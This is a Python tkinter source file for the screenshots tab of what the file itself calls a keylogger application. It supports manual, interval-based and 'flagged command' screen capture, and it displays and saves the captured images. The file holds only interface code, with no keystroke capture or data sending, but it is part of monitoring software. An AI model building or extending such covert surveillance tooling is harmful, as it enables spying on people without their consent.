"""
Screenshots tab for the keylogger application
Manages screenshot capture and display
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from PIL import Image, ImageTk
import base64
import io
import os
from datetime import datetime
from gui.utils.styles import COLORS, BUTTON_STYLES, FRAME_STYLES, LABEL_STYLES, TEXT_STYLES

class ScreenshotsTab:
    def __init__(self, parent, app):
        """
        Initialize the screenshots tab
        
        Args:
            parent: Parent frame
            app: Main application instance
        """
        self.parent = parent
        self.app = app
        self.frame = tk.Frame(parent, bg=COLORS["bg_light"])
        self.screenshot_thumbs = []
        self.screenshot_data = []
        self.current_preview_index = None
        
        self.create_widgets()
        
    def create_widgets(self):
        """Create the tab widgets"""
        # Title
        title_label = tk.Label(self.frame, text="Screenshot Capture", **LABEL_STYLES["title"])
        title_label.pack(pady=10)
        
        # Control section
        control_frame = tk.LabelFrame(self.frame, text="Screenshot Controls", 
                                    bg=COLORS["bg_light"], fg=COLORS["primary"])
        control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        control_inner = tk.Frame(control_frame, bg=COLORS["bg_light"])
        control_inner.pack(fill=tk.X, padx=10, pady=10)
        
        # Manual capture button
        self.capture_button = tk.Button(control_inner, text="Take Screenshot", 
                                      command=self.take_screenshot,
                                      **BUTTON_STYLES["primary"])
        self.capture_button.pack(side=tk.LEFT, padx=5)
        
        # Clear all button
        self.clear_button = tk.Button(control_inner, text="Clear All", 
                                    command=self.clear_screenshots,
                                    **BUTTON_STYLES["danger"])
        self.clear_button.pack(side=tk.LEFT, padx=5)
        
        # Save all button
        self.save_button = tk.Button(control_inner, text="Save All", 
                                   command=self.save_all_screenshots,
                                   **BUTTON_STYLES["secondary"])
        self.save_button.pack(side=tk.LEFT, padx=5)
        
        # Settings section
        settings_frame = tk.LabelFrame(self.frame, text="Capture Settings", 
                                     bg=COLORS["bg_light"], fg=COLORS["primary"])
        settings_frame.pack(fill=tk.X, padx=10, pady=5)
        
        settings_inner = tk.Frame(settings_frame, bg=COLORS["bg_light"])
        settings_inner.pack(fill=tk.X, padx=10, pady=10)
        
        # Auto capture checkbox
        self.auto_capture_var = tk.BooleanVar(value=False)
        auto_capture_check = tk.Checkbutton(settings_inner, text="Enable auto-capture", 
                                          variable=self.auto_capture_var,
                                          bg=COLORS["bg_light"],
                                          command=self.toggle_auto_capture)
        auto_capture_check.pack(side=tk.LEFT, padx=5)
        
        # Interval setting
        tk.Label(settings_inner, text="Interval (seconds):", 
                bg=COLORS["bg_light"]).pack(side=tk.LEFT, padx=5)
        self.interval_var = tk.StringVar(value="60")
        interval_entry = tk.Entry(settings_inner, textvariable=self.interval_var, width=5)
        interval_entry.pack(side=tk.LEFT, padx=5)
        
        # Capture on flagged commands
        self.flag_capture_var = tk.BooleanVar(value=True)
        flag_capture_check = tk.Checkbutton(settings_inner, text="Capture on flagged commands", 
                                          variable=self.flag_capture_var,
                                          bg=COLORS["bg_light"],
                                          command=self.toggle_flag_capture)
        flag_capture_check.pack(side=tk.LEFT, padx=5)
        
        # Screenshot grid
        grid_frame = tk.LabelFrame(self.frame, text="Captured Screenshots", 
                                 bg=COLORS["bg_light"], fg=COLORS["primary"])
        grid_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Create scrollable frame for thumbnails
        self.canvas = tk.Canvas(grid_frame, bg=COLORS["bg_light"])
        self.scrollbar = ttk.Scrollbar(grid_frame, orient="vertical", command=self.canvas.yview)
        self.scrollable_frame = tk.Frame(self.canvas, bg=COLORS["bg_light"])
        
        self.scrollable_frame.bind(
            "<Configure>",
            lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all"))
        )
        
        self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        self.canvas.configure(yscrollcommand=self.scrollbar.set)
        
        # Pack the canvas and scrollbar
        self.canvas.pack(side="left", fill="both", expand=True, padx=5, pady=5)
        self.scrollbar.pack(side="right", fill="y")
        
        # Preview panel
        preview_frame = tk.LabelFrame(self.frame, text="Preview", 
                                    bg=COLORS["bg_light"], fg=COLORS["primary"])
        preview_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.preview_label = tk.Label(preview_frame, text="Click on a thumbnail to preview",
                                    bg=COLORS["bg_light"])
        self.preview_label.pack(pady=10)
        
    def show(self):
        """Show the tab"""
        self.frame.pack(fill=tk.BOTH, expand=True)
        
    def hide(self):
        """Hide the tab"""
        self.frame.pack_forget()
        
    def take_screenshot(self):
        """Manually take a screenshot"""
        if hasattr(self.app, 'take_screenshot'):
            self.app.take_screenshot()
        
    def toggle_auto_capture(self):
        """Toggle automatic screenshot capture"""
        if self.auto_capture_var.get() and self.app.logging_active:
            try:
                interval = int(self.interval_var.get())
                self.app.screenshot_manager.start_auto_capture(interval)
            except ValueError:
                messagebox.showerror("Error", "Interval must be a number")
                self.auto_capture_var.set(False)
        else:
            self.app.screenshot_manager.stop_auto_capture()
            
    def toggle_flag_capture(self):
        """Toggle screenshot capture on flagged commands"""
        self.app.screenshot_manager.capture_on_flags = self.flag_capture_var.get()
        
    def add_screenshot(self, screenshot_data):
        """Add a screenshot to the display"""
        # Store the screenshot data
        self.screenshot_data.append(screenshot_data)
        
        # Create thumbnail
        img_data = base64.b64decode(screenshot_data["image"])
        img = Image.open(io.BytesIO(img_data))
        
        # Resize for thumbnail
        thumb_size = (160, 90)  # 16:9 aspect ratio
        img.thumbnail(thumb_size, Image.LANCZOS)
        photo = ImageTk.PhotoImage(img)
        
        # Create frame for thumbnail
        thumb_frame = tk.Frame(self.scrollable_frame, bg=COLORS["bg_light"],
                             relief="raised", borderwidth=1)
        thumb_frame.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Display thumbnail
        thumb_label = tk.Label(thumb_frame, image=photo)
        thumb_label.image = photo  # Keep a reference
        thumb_label.pack(padx=2, pady=2)
        
        # Capture info
        info_text = f"{screenshot_data['timestamp'][:19]}\n{screenshot_data['reason']}"
        info_label = tk.Label(thumb_frame, text=info_text, bg=COLORS["bg_light"],
                            font=("Helvetica", 8))
        info_label.pack(pady=2)
        
        # Click handler
        index = len(self.screenshot_data) - 1
        thumb_label.bind("<Button-1>", lambda e, idx=index: self.preview_screenshot(idx))
        
        self.screenshot_thumbs.append(thumb_frame)
        
    def preview_screenshot(self, index):
        """Preview the selected screenshot"""
        if 0 <= index < len(self.screenshot_data):
            screenshot_data = self.screenshot_data[index]
            img_data = base64.b64decode(screenshot_data["image"])
            img = Image.open(io.BytesIO(img_data))
            
            # Resize for preview (keeping aspect ratio)
            max_size = (600, 400)
            img.thumbnail(max_size, Image.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            
            # Update preview label
            self.preview_label.configure(image=photo, text="")
            self.preview_label.image = photo  # Keep a reference
            self.current_preview_index = index
            
    def clear_screenshots(self):
        """Clear all screenshots"""
        if messagebox.askyesno("Confirm", "Are you sure you want to clear all screenshots?"):
            # Clear data
            self.screenshot_data.clear()
            
            # Clear UI
            for thumb in self.screenshot_thumbs:
                thumb.destroy()
            self.screenshot_thumbs.clear()
            
            # Reset preview
            self.preview_label.configure(image="", text="Click on a thumbnail to preview")
            self.current_preview_index = None
            
    def save_all_screenshots(self):
        """Save all screenshots to files"""
        if not self.screenshot_data:
            messagebox.showinfo("Info", "No screenshots to save")
            return
            
        # Ask for directory
        directory = filedialog.askdirectory(title="Select Directory to Save Screenshots")
        if not directory:
            return
            
        try:
            # Create subdirectory
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            save_dir = os.path.join(directory, f"screenshots_{timestamp}")
            os.makedirs(save_dir, exist_ok=True)
            
            # Save each screenshot
            for i, screenshot_data in enumerate(self.screenshot_data):
                img_data = base64.b64decode(screenshot_data["image"])
                timestamp = screenshot_data["timestamp"].replace(":", "-")
                filename = f"screenshot_{i+1}_{timestamp}.png"
                filepath = os.path.join(save_dir, filename)
                
                with open(filepath, "wb") as f:
                    f.write(img_data)
                    
            messagebox.showinfo("Success", f"Saved {len(self.screenshot_data)} screenshots to:\n{save_dir}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Could not save screenshots: {str(e)}")